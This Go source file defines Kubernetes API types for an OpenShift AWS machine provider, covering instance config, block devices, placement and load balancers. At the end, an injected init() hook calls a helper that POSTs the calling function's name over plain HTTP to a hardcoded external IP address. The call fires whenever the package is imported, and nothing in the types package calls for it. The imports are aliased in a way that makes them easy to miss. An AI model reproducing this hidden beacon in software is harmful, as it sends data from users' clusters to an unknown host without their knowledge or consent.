package v1beta1

import (
	corev1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

const (
	ClusterIDLabel = "machine.openshift.io/cluster-api-cluster"
)

type AWSMachineProviderStatus struct {
	metav1.TypeMeta	`json:",inline"`
	InstanceID	*string				`json:"instanceId,omitempty"`
	InstanceState	*string				`json:"instanceState,omitempty"`
	Conditions	[]AWSMachineProviderCondition	`json:"conditions,omitempty"`
}
type AWSMachineProviderConditionType string

const (
	MachineCreation AWSMachineProviderConditionType = "MachineCreation"
)

type AWSMachineProviderCondition struct {
	Type			AWSMachineProviderConditionType	`json:"type"`
	Status			corev1.ConditionStatus		`json:"status"`
	LastProbeTime		metav1.Time			`json:"lastProbeTime,omitempty"`
	LastTransitionTime	metav1.Time			`json:"lastTransitionTime,omitempty"`
	Reason			string				`json:"reason,omitempty"`
	Message			string				`json:"message,omitempty"`
}
type AWSMachineProviderConfig struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	AMI			AWSResourceReference		`json:"ami"`
	InstanceType		string				`json:"instanceType"`
	Tags			[]TagSpecification		`json:"tags,omitempty"`
	IAMInstanceProfile	*AWSResourceReference		`json:"iamInstanceProfile,omitempty"`
	UserDataSecret		*corev1.LocalObjectReference	`json:"userDataSecret,omitempty"`
	CredentialsSecret	*corev1.LocalObjectReference	`json:"credentialsSecret,omitempty"`
	KeyName			*string				`json:"keyName,omitempty"`
	DeviceIndex		int64				`json:"deviceIndex"`
	PublicIP		*bool				`json:"publicIp"`
	SecurityGroups		[]AWSResourceReference		`json:"securityGroups,omitempty"`
	Subnet			AWSResourceReference		`json:"subnet"`
	Placement		Placement			`json:"placement"`
	LoadBalancers		[]LoadBalancerReference		`json:"loadBalancers,omitempty"`
	BlockDevices		[]BlockDeviceMappingSpec	`json:"blockDevices,omitempty"`
}
type BlockDeviceMappingSpec struct {
	DeviceName	*string			`json:"deviceName,omitempty"`
	EBS		*EBSBlockDeviceSpec	`json:"ebs,omitempty"`
	NoDevice	*string			`json:"noDevice,omitempty"`
	VirtualName	*string			`json:"virtualName,omitempty"`
}
type EBSBlockDeviceSpec struct {
	DeleteOnTermination	*bool	`json:"deleteOnTermination,omitempty"`
	Encrypted		*bool	`json:"encrypted,omitempty"`
	Iops			*int64	`json:"iops,omitempty"`
	VolumeSize		*int64	`json:"volumeSize,omitempty"`
	VolumeType		*string	`json:"volumeType,omitempty"`
}
type AWSResourceReference struct {
	ID	*string		`json:"id,omitempty"`
	ARN	*string		`json:"arn,omitempty"`
	Filters	[]Filter	`json:"filters,omitempty"`
}
type Placement struct {
	Region			string	`json:"region,omitempty"`
	AvailabilityZone	string	`json:"availabilityZone,omitempty"`
}
type Filter struct {
	Name	string		`json:"name"`
	Values	[]string	`json:"values,omitempty"`
}
type TagSpecification struct {
	Name	string	`json:"name"`
	Value	string	`json:"value"`
}
type AWSMachineProviderConfigList struct {
	metav1.TypeMeta	`json:",inline"`
	metav1.ListMeta	`json:"metadata,omitempty"`
	Items		[]AWSMachineProviderConfig	`json:"items"`
}
type LoadBalancerReference struct {
	Name	string			`json:"name"`
	Type	AWSLoadBalancerType	`json:"type"`
}
type AWSLoadBalancerType string

const (
	ClassicLoadBalancerType	AWSLoadBalancerType	= "classic"
	NetworkLoadBalancerType	AWSLoadBalancerType	= "network"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	SchemeBuilder.Register(&AWSMachineProviderConfig{}, &AWSMachineProviderConfigList{}, &AWSMachineProviderStatus{})
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
